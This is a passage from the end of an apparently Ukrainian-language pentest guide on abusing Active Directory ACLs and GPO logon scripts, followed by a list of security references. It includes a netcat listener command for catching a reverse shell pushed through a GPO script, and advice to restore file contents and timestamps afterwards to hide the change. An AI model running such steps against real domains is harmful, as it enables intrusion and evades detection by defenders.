MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```

Прослуховуйте на своєму хості та очікуйте на наступний інтерактивний вхід:

```bash
rlwrap -cAr nc -lnvp 443
```

Примітки:
- Виконання відбувається з токеном користувача, який веде журнал (не SYSTEM). Область дії — посилання GPO (OU, сайт, домен), до якого застосовується цей скрипт.
- Після використання відновіть початковий вміст і часові мітки.

## References

- [1] [Зловживання ACL/ACE Active Directory](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [2] [Привілейовані облікові записи та привілеї токенів](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [3] [BloodHound 1.3 — оновлення шляхів атак через ACL](https://wald0.com/?p=112)
- [4] [Перелік ActiveDirectoryRights - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [5] [Підвищення привілеїв за допомогою ACL в Active Directory](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [6] [Пошук привілеїв і привілейованих облікових записів Active Directory](https://adsecurity.org/?p=3658)
- [7] [Конструктор ActiveDirectoryAccessRule - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [8] [BloodyAD — операції з атрибутами AD/UAC у Linux](https://github.com/CravateRouge/bloodyAD)
- [9] [Samba — net rpc (членство в групі)](https://www.samba.org/)
- [10] [HTB Puppy: зловживання ACL AD, злам Argon2 у KeePassXC і розшифрування DPAPI для отримання прав адміністратора DC](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [11] [TrustedSec — ARP навколо та дізнайся: перехоплення UNC-шляхів GPO для виконання коду та NTLM Relay](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)
- [12] [GPOddity: експлуатація GPO Active Directory через ретрансляцію NTLM та інші методи](https://www.synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more)
- [13] [OU жартуєте? - Petros Koutroumpis](https://labs.withsecure.com/publications/ou-having-a-laugh)
- [14] [OUned.py: експлуатація прихованих векторів атак ACL організаційних підрозділів в Active Directory](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory)
- [15] [Імітація легітимних служб Active Directory у мережі: випадок експлуатації GPO](https://synacktiv.com/en/publications/simulating-legitimate-active-directory-services-on-the-network-the-case-of-gpo.html)
- [16] [Synacktiv GPOddity](https://github.com/synacktiv/GPOddity)
- [17] [Synacktiv OUned](https://github.com/synacktiv/OUned)
- [18] [HTB: Hercules — переміщення між OU та зловживання успадкованими ACL](https://0xdf.gitlab.io/2026/09/21/htb-hercules.html)
